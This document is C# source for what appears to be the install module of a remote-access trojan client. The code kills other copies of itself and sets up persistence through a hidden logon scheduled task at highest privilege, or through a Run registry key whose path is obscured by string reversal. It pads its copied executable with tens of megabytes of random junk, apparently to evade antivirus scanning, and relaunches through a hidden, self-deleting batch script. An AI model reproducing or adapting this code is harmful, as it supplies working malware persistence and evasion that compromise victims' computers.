using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;

namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            try
            {
                FileInfo installPath = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
                if (Process.GetCurrentProcess().MainModule.FileName != installPath.FullName)
                {

                    for (int i = 0; i < 10; i++)
                    {
                        Thread.Sleep(1000);
                    }

                    foreach (Process P in Process.GetProcesses())
                    {
                        try
                        {
                            if (P.MainModule.FileName == installPath.FullName)
                                P.Kill();
                        }
                        catch { }
                    }
                    if (Methods.IsAdmin())
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "schtasks.exe",
                                Arguments = "/create /f /sc ONLOGON /RL HIGHEST /tn " + @"""'" + Path.GetFileNameWithoutExtension(installPath.FullName) + @"""'" + " /tr " + @"""'" + installPath.FullName + @"""'",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                    }
                    else
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
                        {
                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.FullName), "\"" + installPath.FullName + "\"");
                        }
                    }

                    FileStream fs;
                    if (File.Exists(installPath.FullName))
                    {
                        File.Delete(installPath.FullName);
                        Thread.Sleep(1000);
                    }
                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    fs.Write(clientExe, 0, clientExe.Length);
                    byte[] junk = new byte[new Random().Next(40 * 1024 * 1000, 50 * 1024 * 1000)];
                    new Random().NextBytes(junk);
                    fs.Write(junk, 0, junk.Length);
                    fs.Dispose();

                    Methods.ClientExit();
                    string batch = Path.GetTempFileName() + ".bat";
                    using (StreamWriter sw = new StreamWriter(batch))
                    {
                        sw.WriteLine("@echo off");
                        sw.WriteLine("timeout 3 > NUL");
                        sw.WriteLine("START " + "\"" + "\" " + "\"" + installPath.FullName + "\"");
                        sw.WriteLine("CD " + Path.GetTempPath());
                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                    }
                    Process.Start(new ProcessStartInfo()
                    {
                        FileName = batch,
                        CreateNoWindow = true,
                        ErrorDialog = false,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }

    }
}
